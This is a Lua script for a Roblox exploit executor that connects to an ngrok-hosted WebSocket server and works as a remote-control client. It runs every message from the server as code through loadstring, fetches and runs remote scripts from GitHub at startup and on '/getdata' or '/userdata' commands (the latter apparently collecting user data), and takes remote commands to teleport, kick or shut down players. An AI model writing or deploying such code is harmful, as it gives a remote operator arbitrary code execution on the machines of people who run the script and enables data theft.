-- basic ws
local uri = getgenv().WebSocket or "wss://xochitl-superexacting-unconcentrically.ngrok-free.dev/local_server.js"
local que_teleport = que_on_teleport or queonteleport
local ws = WebSocket.connect(uri)
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local Teleport = game:GetService("TeleportService")
loadstring(game:HttpGet("https://raw.githubusercontent.com/Asepthegoat/LIUDEX-Z/refs/heads/main/script/tools/functions.lua"))()
ws.OnClose:Connect(function()
	print("Closed")
end)

ws:Send("/join " .. player.Name)
player.Chatted:Connect(function(msg)
	if string.find(msg,"/bring") then
		ws:Send(msg .. " " .. player.Name)
	else
		ws:Send(msg)
	end
end)

function depsignalargs(signal)
	local args = string.split(signal," ")
	return args
end
function signalargs(msg) --inQuote by gpt
	local args = {}
	local current = ""
	local inQuote = false

	for i = 1, #msg do
		local char = string.sub(msg, i, i)

		if char == '"' then
			inQuote = not inQuote
		elseif char == " " and not inQuote then
			if current ~= "" then
				table.insert(args, current)
				current = ""
			end
		else
			current = current .. char
		end
	end

	if current ~= "" then
		table.insert(args, current)
	end

	return args
end

function findPlayer(partialName) -- Asep skill isue
    local lowerPartial = string.lower(partialName)
    for _, plr in ipairs(Players:GetPlayers()) do
        -- cek apakah substring ada di nama player
        if string.find(string.lower(plr.Name), lowerPartial, 1, true) then
            return plr
        end
    end
    return nil
end


-- fungsi bring
function bring(targetPlayer, cordinateCFrame)
	if targetPlayer == player or targetPlayer == "@all" then
		print("run bring")
		local char = player.Character
		if char and char:FindFirstChild("HumanoidRootPart") then
			print("if success")
			print(targetPlayer,cordinateCFrame)
			if Players[cordinateCFrame].Name == cordinateCFrame then
				char.HumanoidRootPart.CFrame = Players[cordinateCFrame].Character.HumanoidRootPart.CFrame
			else
				char.HumanoidRootPart.CFrame = cordinateCFrame
			end
		end
	end
end

-- handler message
ws.OnMessage:Connect(function(message)
	print("Received:", message)
	local f, err = loadstring(message)
	if not f then
		local signal = signalargs(message)
		local cmd = signal[1]:lower()
		print(signal[1],signal[2],signal[3])
		local name = player.Name
		if signal[1] == "/bring" then
			local target = findPlayer(signal[2])
			bring(target,signal[3])
		elseif signal[1] == "/speed" then
			if signal[2] == player.Name then
				local target = findPlayer(signal[2])
				target.Character.Humanoid.WalkSpeed = signal[3]
			end
		elseif signal[1] == "/game" then
			if signal[2] == "@all" then
				Teleport:Teleport(signal[3],player)
			elseif signal[2] == player.Name then
				Teleport:Teleport(signal[3],player)
			elseif not signal[3] and signal[2] == player.Name then
				Teleport:Teleport(game.PlaceId,player)
			elseif not signal[3] and signal[2] == "@all" then
				Teleport:Teleport(game.PlaceId,player)
			else
				return
			end
		elseif signal[1] == "/closeall" or signal[1] == "/shutdown" or signal[1] == "/leaveall" then
			game:Shutdown()
		elseif signal[1] == "/join" then
			print(findPlayer(signal[2]).Name .. " has join the server")
		elseif signal[1] == "/test" then
			print(signal[2])
		elseif signal[1] == "/sendwebhook" or signal[1] == "/userdata" or signal[1] == "/getdata" then
			if signal[2] == player.Name or signal[2] == "all" then
				loadstring(game:HttpGet("https://raw.githubusercontent.com/Asepthegoat/LIUDEX-Z/refs/heads/main/script/tools/user-data.lua"))()
			end
		elseif signal[1] == "/kick" then
			local target = findPlayer(signal[2])
			target:Kick(signal[3]) --kick Asepjuragan_fruit "lu tolol bot bgt yapit"
		elseif signal[1] == "/code" then
			local target = findPlayer(signal[2])
			loadstring(signal[2],signal[3])()
		else
			warn("error is not a ldx command or code")
		end
	else
		f()
	end
end)

-- serialize CFrame jadi string valid Lua
local cf = player.Character.HumanoidRootPart.CFrame
local cfString = string.format("CFrame.new(%f,%f,%f)", cf.X, cf.Y, cf.Z)

--[[
local testtable = {
	"loadstring%((.-)%)%(%)",
	"require%((.-)%)"
}

local text = 'print("test") loadstring("abc")() require(123)'

local filtered = filterstring(text, testtable)
]]
local cfString = string.format("Vector3.new(%f,%f,%f)", cf.X, cf.Y, cf.Z)
que_teleport()
